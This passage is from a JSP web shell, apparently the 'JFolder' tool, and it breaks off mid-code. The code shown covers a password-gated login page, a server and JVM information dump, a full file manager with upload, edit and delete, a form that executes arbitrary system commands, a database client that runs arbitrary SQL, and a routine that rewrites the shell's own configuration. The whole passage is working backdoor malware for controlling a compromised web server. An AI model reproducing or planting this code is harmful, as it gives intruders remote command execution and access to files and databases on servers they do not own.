	public void setPassword(String password) throws JshellConfigException {
		Pattern p = Pattern.compile("\\w+");
		Matcher m = p.matcher(password);
		
		if (! m.matches()) {
			throw new JshellConfigException("&#23494;&#30721;&#19981;&#33021;&#26377;&#38500;&#23383;&#27597;&#25968;&#23383;&#19979;&#21010;&#32447;&#20197;&#22806;&#30340;&#23383;&#31526;");
		}
		
		p = Pattern.compile("private\\sString\\s_password\\s=\\s\"" + _password + "\"");
		m = p.matcher(_jshellContent);
		if (! m.find()) {
			throw new JshellConfigException("&#31243;&#24207;&#20307;&#24050;&#32463;&#34987;&#38750;&#27861;&#20462;&#25913;");
		}
		
		_jshellContent = m.replaceAll("private String _password = \"" + password + "\"");
		
		//return HTMLEncode(_jshellContent);
	}
	
	public void setEncodeType(String encodeType) throws JshellConfigException {
		Pattern p = Pattern.compile("[A-Za-z0-9]+");
		Matcher m = p.matcher(encodeType);
		
		if (! m.matches()) {
			throw new JshellConfigException("&#32534;&#30721;&#26684;&#24335;&#21482;&#33021;&#26159;&#23383;&#27597;&#21644;&#25968;&#23383;&#30340;&#32452;&#21512;");
		}
		
		p = Pattern.compile("private\\sString\\s_encodeType\\s=\\s\"" + _encodeType + "\"");
		m = p.matcher(_jshellContent);
		
		if (! m.find()) {
			throw new JshellConfigException("&#31243;&#24207;&#20307;&#24050;&#32463;&#34987;&#38750;&#27861;&#20462;&#25913;");
		}
		
		_jshellContent = m.replaceAll("private String _encodeType = \"" + encodeType + "\"");
		//return HTMLEncode(_jshellContent);
	}
	
	public void setSessionTime(String sessionTime) throws JshellConfigException {
		Pattern p = Pattern.compile("\\d+");
		Matcher m = p.matcher(sessionTime);
		
		if (! m.matches()) {
			throw new JshellConfigException("session&#36229;&#26102;&#26102;&#38388;&#21482;&#33021;&#22635;&#25968;&#23383;");
		}
		
		p = Pattern.compile("private\\sint\\s_sessionOutTime\\s=\\s" + _sessionOutTime);
		m = p.matcher(_jshellContent);
		
		if (! m.find()) {
			throw new JshellConfigException("&#31243;&#24207;&#20307;&#24050;&#32463;&#34987;&#38750;&#27861;&#20462;&#25913;");
		}
		
		_jshellContent = m.replaceAll("private int _sessionOutTime = " + sessionTime);
		//return HTMLEncode(_jshellContent);
	}
	
	public void setTextFileTypes(String[] textFileTypes) throws JshellConfigException {
		Pattern p = Pattern.compile("\\w+");
		Matcher m = null;
		int i;
		String fileTypes = "";
		String tmpFileTypes = "";
		
		for (i = 0; i < textFileTypes.length; i ++) {
			m = p.matcher(textFileTypes[i]);
			
			if (! m.matches()) {
				throw new JshellConfigException("&#25193;&#23637;&#21517;&#21482;&#33021;&#26159;&#23383;&#27597;&#25968;&#23383;&#21644;&#19979;&#21010;&#32447;&#30340;&#32452;&#21512;");
			}
			
			if (i != textFileTypes.length - 1)
				fileTypes += "\"" + textFileTypes[i] + "\"" + ", ";
			else
				fileTypes += "\"" + textFileTypes[i] + "\"";
		}
		
		for (i = 0; i < _textFileTypes.length; i ++) {
			if (i != _textFileTypes.length - 1)
				tmpFileTypes += "\"" + _textFileTypes[i] + "\"" + ", ";
			else
				tmpFileTypes += "\"" + _textFileTypes[i] + "\"";
		}
		
		p = Pattern.compile(tmpFileTypes);
		m = p.matcher(_jshellContent);
		
		if (! m.find()) {
			throw new JshellConfigException("&#31243;&#24207;&#25991;&#20214;&#24050;&#32463;&#34987;&#38750;&#27861;&#20462;&#25913;");
		}
		
		_jshellContent = m.replaceAll(fileTypes);
		
		//return HTMLEncode(_jshellContent);
	}
	
	public String getContent() {
		return HTMLEncode(_jshellContent);
	}
}

class JshellConfigException extends Exception {
	public JshellConfigException(String message) {
		super(message);
	}
}
%>
<html>
<head>
<title>JFolder New4&#20462;&#25913;&#29256;</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312"></head>
<style>
body {
	font-size: 14px;
	font-family: &#23435;&#20307;;
	background-color: #CCCCCC;
}
td {
	font-size: 14px;
	font-family: &#23435;&#20307;;
}

input.textbox {
	border: black solid 1;
	font-size: 12px;
	height: 18px;
}

input.button {
	font-size: 12px;
	font-family: &#23435;&#20307;;
	border: black solid 1;
}

td.datarows {
	font-size: 14px;
	font-family: &#23435;&#20307;;
	height: 25px;
}

textarea {
border: black solid 1;
}
.inputLogin {font-size: 9pt;border:1px solid lightgrey;background-color: lightgrey;}
.table1 {BORDER:gray 0px ridge;}
.td2 {BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:lightgrey; height:18px;}
.tr1 {BACKGROUND-color:gray }
</style>
<script language="JavaScript">
<!--
function ltrim(str) {
	while (str.indexOf(0) == " ")
		str = str.substring(1);
		
	return str;
}

function changeAction(obj) {
	obj.submit();
}
//-->
</script>
<body>
<%
session.setMaxInactiveInterval(_sessionOutTime * 60);

if (request.getParameter("password") == null && session.getAttribute("password") == null) {
// show the login form
//================================================================================================
%>
<div align="center" style="position:absolute;width:100%;visibility:show; z-index:0;left:14px;top:200px">
  <TABLE class="table1" cellSpacing="1" cellPadding="1" width="473" border="0" align="center">
    <tr>
      <td class="tr1">
        <TABLE cellSpacing="0" cellPadding="0" width="468" border="0">
          <tr>
            <TD align="left"><FONT face="webdings" color="#ffffff">&nbsp;8</FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff"><b>&#31649;&#29702;&#30331;&#24405; :::...</b></font></TD>
            <TD align="right"><FONT color="#d2d8ec"><b>JFolder</b>_By_<b>New4</b></FONT></TD>
          </tr>
            <form name="f1" method="post">
            <input type="hidden" name="__EVENTTARGET" value="" />
            <input type="hidden" name="__EVENTARGUMENT" value="" />
   <!--   <input type="hidden" name="__VIEWSTATE" value="dDwtMTQyNDQzOTM1NDt0PDtsPGk8OT47PjtsPHQ8cDxsPGVuY3R5cGU7PjtsPG11bHRpcGFydC9mb3JtLWRhdGE7Pj47bDxpPDE5Pjs+O2w8dDxAMDw7Ozs7Ozs7Ozs7Pjs7Pjs+Pjs+PjtsPE5ld0ZpbGU7TmV3RmlsZTtOZXdEaXJlY3Rvcnk7TmV3RGlyZWN0b3J5O0RCX3JCX01TU1FMO0RCX3JCX01TU1FMO0RCX3JCX0FjY2VzcztEQl9yQl9BY2Nlc3M7Pj7Z5iNIVOaWZWuK0pv8lCMSbhytgQ==" />
  &#36825;&#37324;&#19981;&#30693;&#36947;&#26159;&#20160;&#20040;&#12290; -->
            <script language="javascript" type="text/javascript">
<!--
	function __doPostBack(eventTarget, eventArgument) {
		var theform;
		if (window.navigator.appName.toLowerCase().indexOf("microsoft") > -1) {
			theform = document.Form1;
		}
		else {
			theform = document.forms["Form1"];
		}
		theform.__EVENTTARGET.value = eventTarget.split("$").join(":");
		theform.__EVENTARGUMENT.value = eventArgument;
		theform.submit();
	}
// -->
</script>
            <tr>
              <td height="30" align="center" class="td2" colspan="2">
                <input name="password" type="password" class="textbox" id="Textbox" />
                <input type="submit" name="Button" value="Login" id="Button" title="Click here to login" class="button" />
              </td>
            </tr>
          </form>
          <SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url='></SCRIPT>
      </TABLE></td>
    </tr>
  </TABLE>
</div>
<%
//================================================================================================
// end of the login form
} else {
	String password = null;
	
	if (session.getAttribute("password") == null) {
		password = (String)request.getParameter("password");
		
		if (validate(password) == false) {
			out.println("<div align=\"center\"><font color=\"red\"><li>&#21710;&#21568;&#65292;&#20498;&#38665;&#27515;&#21862;!</font></div>");
			out.close();
			return;
		}
		
		session.setAttribute("password", password);
	} else {
		password = (String)session.getAttribute("password");
	}
	
	String action = null;
	

	if (request.getParameter("action") == null)
		action = "main";
	else 
		action = (String)request.getParameter("action");
		
	if (action.equals("exit")) {
		session.removeAttribute("password");
		response.sendRedirect(request.getRequestURI());
		out.close();
		return;
	}

// show the main menu
//====================================================================================
%>
<table align="center" width="600" border="0" cellpadding="2" cellspacing="0">
	<form name="form1" method="get">
	<tr bgcolor="#CCCCCC">
		<td id="title"><!--[&#31243;&#24207;&#39318;&#39029;]--></td>
		<td align="right">
			<select name="action" onChange="javascript:changeAction(document.form1)">
				<option value="main">&#31243;&#24207;&#39318;&#39029;</option>
				<option value="filesystem">&#25991;&#20214;&#31995;&#32479;</option>
				<option value="command">&#31995;&#32479;&#21629;&#20196;</option>
				<option value="database">&#25968;&#25454;&#24211;</option>
				<option value="config">&#31243;&#24207;&#37197;&#32622;</option>
				<option value="about">&#20851;&#20110;&#31243;&#24207;</option>
				<option value="exit">&#36864;&#20986;&#31243;&#24207;</option>
			</select>
<script language="JavaScript">
<%
	out.println("var action = \"" + action + "\"");
%>
var sAction = document.form1.action;
for (var i = 0; i < sAction.length; i ++) {
	if (sAction[i].value == action) {
		sAction[i].selected = true;
		//title.innerHTML = "[" + sAction[i].innerHTML + "]";
	}
}
</script>
		</td>
	</tr>
	</form>
</table>
<%
//=====================================================================================
// end of main menu

	if (action.equals("main")) {
// print the system info table
//=======================================================================================
%>
<table align="center" width="600" cellpadding="2" cellspacing="1" border="0" bgcolor="#CCCCCC">
	<tr bgcolor="#FFFFFF">
		<td colspan="2" align="center">&#26381;&#21153;&#22120;&#20449;&#24687;</td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#26381;&#21153;&#22120;&#21517;</td>
		<td align="center" class="datarows"><%=request.getServerName()%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#26381;&#21153;&#22120;&#31471;&#21475;</td>
		<td align="center" class="datarows"><%=request.getServerPort()%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#25805;&#20316;&#31995;&#32479;</td>
		<td align="center" class="datarows"><%=System.getProperty("os.name") + " " + System.getProperty("os.version") + " " + System.getProperty("os.arch")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#24403;&#21069;&#29992;&#25143;&#21517;</td>
		<td align="center" class="datarows"><%=System.getProperty("user.name")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#24403;&#21069;&#29992;&#25143;&#30446;&#24405;</td>
		<td align="center" class="datarows"><%=System.getProperty("user.home")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#24403;&#21069;&#29992;&#25143;&#24037;&#20316;&#30446;&#24405;</td>
		<td align="center" class="datarows"><%=System.getProperty("user.dir")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#31243;&#24207;&#30456;&#23545;&#36335;&#24452;</td>
		<td align="center" class="datarows"><%=request.getRequestURI()%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#31243;&#24207;&#32477;&#23545;&#36335;&#24452;</td>
		<td align="center" class="datarows"><%=request.getRealPath(request.getServletPath())%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#32593;&#32476;&#21327;&#35758;</td>
		<td align="center" class="datarows"><%=request.getProtocol()%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#26381;&#21153;&#22120;&#36719;&#20214;&#29256;&#26412;&#20449;&#24687;</td>
		<td align="center" class="datarows"><%=application.getServerInfo()%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JDK&#29256;&#26412;</td>
		<td align="center" class="datarows"><%=System.getProperty("java.version")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JDK&#23433;&#35013;&#36335;&#24452;</td>
		<td align="center" class="datarows"><%=System.getProperty("java.home")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JAVA&#34394;&#25311;&#26426;&#29256;&#26412;</td>
		<td align="center" class="datarows"><%=System.getProperty("java.vm.specification.version")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JAVA&#34394;&#25311;&#26426;&#21517;</td>
		<td align="center" class="datarows"><%=System.getProperty("java.vm.name")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JAVA&#31867;&#36335;&#24452;</td>
		<td align="center" class="datarows"><%=System.getProperty("java.class.path")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JAVA&#36733;&#20837;&#24211;&#25628;&#32034;&#36335;&#24452;</td>
		<td align="center" class="datarows"><%=System.getProperty("java.library.path")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JAVA&#20020;&#26102;&#30446;&#24405;</td>
		<td align="center" class="datarows"><%=System.getProperty("java.io.tmpdir")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">JIT&#32534;&#35793;&#22120;&#21517;</td>
		<td align="center" class="datarows"><%=System.getProperty("java.compiler") == null ? "" : System.getProperty("java.compiler")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#25193;&#23637;&#30446;&#24405;&#36335;&#24452;</td>
		<td align="center" class="datarows"><%=System.getProperty("java.ext.dirs")%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td colspan="2" align="center">&#23458;&#25143;&#31471;&#20449;&#24687;</td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#23458;&#25143;&#26426;&#22320;&#22336;</td>
		<td align="center" class="datarows"><%=request.getRemoteAddr()%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#26381;&#21153;&#26426;&#22120;&#21517;</td>
		<td align="center" class="datarows"><%=request.getRemoteHost()%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#29992;&#25143;&#21517;</td>
		<td align="center" class="datarows"><%=request.getRemoteUser() == null ? "" : request.getRemoteUser()%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#35831;&#27714;&#26041;&#24335;</td>
		<td align="center" class="datarows"><%=request.getScheme()%></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center" class="datarows">&#24212;&#29992;&#23433;&#20840;&#22871;&#25509;&#23383;&#23618;</td>
		<td align="center" class="datarows"><%=request.isSecure() == true ? "&#26159;" : "&#21542;"%></td>
	</tr>
</table>
<%
//=======================================================================================
// end of printing the system info table
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	} else if (action.equals("filesystem")) {
		String curPath = "";
		String result = "";
		String fsAction = "";
		
		if (request.getParameter("curPath") == null) {
			curPath = request.getRealPath(request.getServletPath());
			curPath = pathConvert((new File(curPath)).getParent());
		} else {
			curPath = Unicode2GB((String)request.getParameter("curPath"));
		}
		
		if (request.getParameter("fsAction") == null) {
			fsAction = "list";
		} else {
			fsAction = (String)request.getParameter("fsAction");
		}
		
		if (fsAction.equals("list"))
			result = listFiles(curPath, request.getRequestURI() + "?action=" + action);
		else if (fsAction.equals("browse")) {
			result = listFiles(new File(curPath).getParent(), request.getRequestURI() + "?action=" + action);
			result += browseFile(curPath);
		}
		else if (fsAction.equals("open"))
			result = openFile(curPath, request.getRequestURI() + "?action=" + action);
		else if (fsAction.equals("save")) {
			if (request.getParameter("fileContent") == null) {
				result = "<font color=\"red\">&#39029;&#38754;&#23548;&#33322;&#38169;&#35823;</font>";
			} else {
				String fileContent = Unicode2GB((String)request.getParameter("fileContent"));
				result = saveFile(curPath, request.getRequestURI() + "?action=" + action, fileContent);
			}
		} else if (fsAction.equals("createFolder")) {
			if (request.getParameter("folderName") == null) {
				result = "<font color=\"red\">&#30446;&#24405;&#21517;&#19981;&#33021;&#20026;&#31354;</font>";
			} else {
				String folderName = Unicode2GB(request.getParameter("folderName").trim());
				if (folderName.equals("")) {
					result = "<font color=\"red\">&#30446;&#24405;&#21517;&#19981;&#33021;&#20026;&#31354;</font>"; 
				} else {
					result = createFolder(curPath, request.getRequestURI() + "?action=" + action, folderName);
				}
			}
		} else if (fsAction.equals("createFile")) {
			if (request.getParameter("fileName") == null) {
				result = "<font color=\"red\">&#25991;&#20214;&#21517;&#19981;&#33021;&#20026;&#31354;</font>";
			} else {
				String fileName = Unicode2GB(request.getParameter("fileName").trim());
				if (fileName.equals("")) {
					result = "<font color=\"red\">&#25991;&#20214;&#21517;&#19981;&#33021;&#20026;&#31354;</font>";
				} else {
					result = createFile(curPath, request.getRequestURI() + "?action=" + action, fileName);
				}
			}
		} else if (fsAction.equals("deleteFile")) {
			if (request.getParameter("filesDelete") == null) {
				result = "<font color=\"red\">&#27809;&#26377;&#36873;&#25321;&#35201;&#21024;&#38500;&#30340;&#25991;&#20214;</font>";
			} else {
				String[] files2Delete = (String[])request.getParameterValues("filesDelete");
				if (files2Delete.length == 0) {
					result = "<font color=\"red\">&#27809;&#26377;&#36873;&#25321;&#35201;&#21024;&#38500;&#30340;&#25991;&#20214;</font>";
				} else {
					for (int n = 0; n < files2Delete.length; n ++) {
						files2Delete[n] = Unicode2GB(files2Delete[n]);
					}
					result = deleteFile(curPath, request.getRequestURI() + "?action=" + action, files2Delete);
				}
			}
		} else if (fsAction.equals("saveAs")) {
			if (request.getParameter("fileContent") == null) {
				result = "<font color=\"red\">&#39029;&#38754;&#23548;&#33322;&#38169;&#35823;</font>";
			} else {
				String fileContent = Unicode2GB(request.getParameter("fileContent"));
				result = saveAs(curPath, request.getRequestURI() + "?action=" + action, fileContent);
			}
		} else if (fsAction.equals("upload")) {
			result = uploadFile(request, curPath, request.getRequestURI() + "?action=" + action);
		} else if (fsAction.equals("copyto")) {
			if (request.getParameter("filesDelete") == null || request.getParameter("dstPath") == null) {
				result = "<font color=\"red\">&#27809;&#26377;&#36873;&#25321;&#35201;&#22797;&#21046;&#30340;&#25991;&#20214;</font>";
			} else {
				String[] files2Copy = request.getParameterValues("filesDelete");
				String dstPath = request.getParameter("dstPath").trim();
				if (files2Copy.length == 0) {
					result = "<font color=\"red\">&#27809;&#26377;&#36873;&#25321;&#35201;&#22797;&#21046;&#30340;&#25991;&#20214;</font>";
				} else if (dstPath.equals("")) {
					result = "<font color=\"red\">&#27809;&#26377;&#22635;&#20889;&#35201;&#22797;&#21046;&#21040;&#30340;&#30446;&#24405;&#36335;&#24452;</font>";
				} else {
					for (int i = 0; i < files2Copy.length; i ++)
						files2Copy[i] = Unicode2GB(files2Copy[i]);
					
					result = copyFiles(curPath, request.getRequestURI() + "?action=" + action, files2Copy, Unicode2GB(dstPath));
				}
			}
		} else if (fsAction.equals("rename")) {
			if (request.getParameter("fileRename") == null) {
				result = "<font color=\"red\">&#39029;&#38754;&#23548;&#33322;&#38169;&#35823;</font>";
			} else {
				String file2Rename = request.getParameter("fileRename").trim();
				String newName = request.getParameter("newName").trim();
				if (file2Rename.equals("")) {
					result = "<font color=\"red\">&#27809;&#26377;&#36873;&#25321;&#35201;&#37325;&#21629;&#21517;&#30340;&#25991;&#20214;</font>";
				} else if (newName.equals("")) {
					result = "<font color=\"red\">&#27809;&#26377;&#22635;&#20889;&#26032;&#25991;&#20214;&#21517;</font>";
				} else {
					result = renameFile(curPath, request.getRequestURI() + "?action=" + action, Unicode2GB(file2Rename), Unicode2GB(newName));
				}			
			}
		}
%>
<table align="center" width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
	<form method="post" name="form2" action="<%= request.getRequestURI() + "?action=" + action%>">
	<tr bgcolor="#FFFFFF">
		<td align="center">&#22320;&#22336;&nbsp;&nbsp;<input type="text" size="80" name="curPath" class="textbox" value="<%=curPath%>" />
											 <input type="submit" value="&#36716;&#21040;" class="button" /></td>
	</tr>
	</form>
	<tr bgcolor="#FFFFFF">
		<td><%= result.trim().equals("")?"&nbsp;" : result%></td>
	</tr>
</table>
<%		
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	} else if (action.equals("command")) {
		String cmd = "";
		InputStream ins = null;
		String result = "";
		
		if (request.getParameter("command") != null) {		
			cmd = (String)request.getParameter("command");
			result = exeCmd(cmd);
		}
// print the command form
//========================================================================================
%>
<table border="0" width="600" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC" align="center">
	<form name="form2" method="post" action="<%=request.getRequestURI() + "?action=" + action%>">
	<tr bgcolor="#FFFFFF">
		<td align="center">&#25191;&#34892;&#21629;&#20196;</td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="center">
			<input type="text" class="textbox" size="80" name="command" value="<%=cmd%>" />
			<input type="submit" class="button" value="&#25191;&#34892;" />
		</td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="center">&#25191;&#34892;&#32467;&#26524;</td>
	</tr>
	</form>
</table>
<table align="center" width="600" border="0">
	<tr>
		<td><%=result == "" ? "&nbsp;" : result%></td>
	</tr>
</table>
<%
//=========================================================================================
// end of printing command form
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	} else if (action.equals("database")) {
		String dbAction = "";
		String result = "";
		String dbType = "";
		String dbServer = "";
		String dbPort = "";
		String dbUsername = "";
		String dbPassword = "";
		String dbName = "";
		String dbResult = "";
		String sql = "";
		
		if (request.getParameter("dbAction") == null) {
			dbAction = "main";
		} else {
			dbAction = request.getParameter("dbAction").trim();
			if (dbAction.equals(""))
				dbAction = "main";
		}
		
		if (dbAction.equals("main")) {
			result = "&nbsp;";
		} else if (dbAction.equals("dbConnect")) {
			if (request.getParameter("dbType") == null ||
				request.getParameter("dbServer") == null ||
				request.getParameter("dbPort") == null ||
				request.getParameter("dbUsername") == null ||
				request.getParameter("dbPassword") == null ||
				request.getParameter("dbName") == null) {
				response.sendRedirect(request.getRequestURI() + "?action=" + action);
			} else {
				dbType = request.getParameter("dbType").trim();
				dbServer = request.getParameter("dbServer").trim();
				dbPort = request.getParameter("dbPort").trim();
				dbUsername = request.getParameter("dbUsername").trim();
				dbPassword = request.getParameter("dbPassword").trim();
				dbName = request.getParameter("dbName").trim();
				
				if (DBInit(dbType, dbServer, dbPort, dbUsername, dbPassword, dbName)) {
					if (DBConnect(dbUsername, dbPassword)) {
						if (request.getParameter("sql") != null) {
							sql = request.getParameter("sql").trim();
							if (! sql.equals("")) {
								dbResult = DBExecute(sql);
							}
						}
						
						result =  "<script language=\"javascript\">\n";
						result += "<!--\n";
						result += "function exeSql() {\n";
						result += "    if (ltrim(document.dbInfo.sql.value) != \"\")\n";
						result += "        document.dbInfo.submit();";
						result += "}\n";
						result += "\n";
						result += "function resetIt() {\n";
						result += "	   document.dbInfo.sql.value = \"\";";
						result += "}\n";
						result += "//-->\n";
						result += "</script>\n";
						result += "sql&#35821;&#21477;<br/><textarea name=\"sql\" cols=\"70\" rows=\"6\">" + sql + "</textarea><br/><input type=\"submit\" class=\"button\" onclick=\"javascript:exeSql()\" value=\"&#25191;&#34892;\"/>&nbsp;<input type=\"reset\" class=\"button\" onclick=\"javascript:resetIt()\" value=\"&#28165;&#31354;\"/>\n";
						
						DBRelease();
					} else {
						result = "<font color=\"red\">&#25968;&#25454;&#24211;&#36830;&#25509;&#22833;&#36133;</font>";
					}
				} else {
					result = "<font color=\"red\">&#25968;&#25454;&#24211;&#36830;&#25509;&#39537;&#21160;&#27809;&#26377;&#25214;&#21040;</font>";
				}				
			}
		}
%>
<script language="javascript">
<!--
<%
out.println("var selectedType = \"" + dbType + "\";");
%>
//-->
</script>
<table align="center" width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
	<form name="dbInfo" method="post" action="<%=request.getRequestURI() + "?action=" + action + "&dbAction=dbConnect"%>">
	<tr bgcolor="#FFFFFF">
		<td width="300" align="center">&#25968;&#25454;&#24211;&#36830;&#25509;&#31867;&#22411;</td>
		<td align="center">
			<select name="dbType">
				<option value="sqlserver">SQLServer&#25968;&#25454;&#24211;</option>
				<option value="mysql">MySql&#25968;&#25454;&#24211;</option>
				<option value="oracle">Oracle&#25968;&#25454;&#24211;</option>
				<option value="db2">DB2&#25968;&#25454;&#24211;</option>
				<option value="odbc">ODBC&#25968;&#25454;&#28304;</option>
			</select>
			<script language="javascript">
			for (var i = 0; i < document.dbInfo.dbType.options.length; i ++) {
				if (document.dbInfo.dbType.options[i].value == selectedType) {
					document.dbInfo.dbType.options[i].selected = true;
				}
			}
			</script>
		</td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="center">&#25968;&#25454;&#24211;&#26381;&#21153;&#22120;&#22320;&#22336;</td>
		<td align="center"><input type="text" name="dbServer" class="textbox" value="<%=dbServer%>" style="width:150px;" /></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="center">&#25968;&#25454;&#24211;&#26381;&#21153;&#22120;&#31471;&#21475;</td>
		<td align="center"><input type="text" name="dbPort" class="textbox" value="<%=dbPort%>" style="width:150px;" /></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="center">&#25968;&#25454;&#24211;&#29992;&#25143;&#21517;</td>
		<td align="center"><input type="text" name="dbUsername" class="textbox" value="<%=dbUsername%>" size="20" style="width:150px;" /></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="center">&#25968;&#25454;&#24211;&#23494;&#30721;</td>
		<td align="center"><input type="password" name="dbPassword" class="textbox" value="<%=dbPassword%>" size="20" style="width:150px;" /></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="center">&#25968;&#25454;&#24211;&#21517;</td>
		<td align="center"><input type="text" name="dbName" class="textbox" value="<%=dbName%>" size="20" style="width:150px;" /></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="center" colspan="2"><input type="submit" value="&#36830;&#25509;" class="button" />&nbsp;<input type="reset" value="&#37325;&#32622;" class="button" /></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="center" colspan="2"><%=result%></td>
	</tr>
	</form>
</table>
<table align="center" width="100%" border="0">
	<tr>
		<td align="center">
			<%=dbResult%>
		</td>
	</tr>
</table>
<%		

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////		
	} else if (action.equals("config")) {
		String cfAction = "";
		int i;
		
		if (request.getParameter("cfAction") == null) {

			cfAction = "main";
		} else {
			cfAction = request.getParameter("cfAction").trim();
			if (cfAction.equals(""))
				cfAction = "main";
		}
		
		if (cfAction.equals("main")) {
// start of config form
//==========================================================================================
%>
<script language="javascript">
<!--
function delFileType() {
	document.config.newType.value = document.config.textFileTypes[document.config.textFileTypes.selectedIndex].value;
	document.config.textFileTypes.options.remove(document.config.textFileTypes.selectedIndex);
}

function addFileType() {
	if (document.config.newType.value != "") {
		var oOption = document.createElement("OPTION");
		document.config.textFileTypes.options.add(oOption);
		oOption.value = document.config.newType.value;
		oOption.innerHTML = document.config.newType.value;
	}
}

function selectAllTypes() {
	for (var i = 0; i < document.config.textFileTypes.options.length; i ++) {
		document.config.textFileTypes.options[i].selected = true;
	}
}
//-->
</script>
<table align="center" width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
	<form name="config" method="post" action="<%=request.getRequestURI() + "?action=config&cfAction=save"%>" onSubmit="javascript:selectAllTypes()">
	<tr bgcolor="#FFFFFF">
		<td align="center" width="200">&#23494;&#30721;</td>
		<td><input type="text" size="30" name="password" class="textbox" value="<%=_password%>" /></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="center">&#31995;&#32479;&#32534;&#30721;</td>
		<td><input type="text" size="30" name="encode" value="<%=_encodeType%>" class="textbox" /></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="center">Session&#36229;&#26102;&#26102;&#38388;</td>
		<td><input type="text" size="5" name="sessionTime" class="textbox" value="<%=_sessionOutTime%>" /></td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="center">&#21487;&#32534;&#36753;&#25991;&#20214;&#31867;&#22411;</td>
		<td>
			<table border="0" width="190" cellpadding="0" cellspacing="0">
				<tr>
					<td>
						<input type="text" size="11" class="textbox" name="newType" />
					</td>
					<td align="center">
						<input type="button" onClick="javascript:delFileType()" value="<<" class="button" />
						<p></p>
						<input type="button" value=">>" onClick="javascript:addFileType()" class="button" />
					</td>
					<td align="right">	
						<select name="textFileTypes" size="4" style="width: 87px" multiple="true">  
<%
		for (i = 0; i < _textFileTypes.length; i ++) {
%>
							<option value="<%=_textFileTypes[i]%>"><%=_textFileTypes[i]%></option>
<%
 		}
%>
						</select>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr bgcolor="#FFFFFF">
		<td align="center" colspan="2"><input type="submit" value="&#20445;&#23384;" class="button" /></td>
	</tr>
	</form>
</table>
<%
		} else if (cfAction.equals("save")) {
			if (request.getParameter("password") == null || 
				request.getParameter("encode") == null || 
				request.getParameter("sessionTime") == null ||
				request.getParameterValues("textFileTypes") == null) {
				response.sendRedirect(request.getRequestURI());
			}
			
			String result = "";
			
			String newPassword = request.getParameter("password").trim();
			String newEncodeType = request.getParameter("encode").trim();
			String newSessionTime = request.getParameter("sessionTime").trim();
			String[] newTextFileTypes = request.getParameterValues("textFileTypes");
			String jshellPath = request.getRealPath(request.getServletPath());
			
			try {
				JshellConfig jconfig = new JshellConfig(jshellPath);
				jconfig.setPassword(newPassword);
				jconfig.setEncodeType(newEncodeType);
				jconfig.setSessionTime(newSessionTime);
				jconfig.setTextFileTypes(newTextFileTypes);
				jconfig.save();
				result += "&#35774;&#32622;&#20445;&#23384;&#25104;&#21151;&#65292;&#27491;&#22312;&#36820;&#22238;&#65292;&#35831;&#31245;&#20505;";
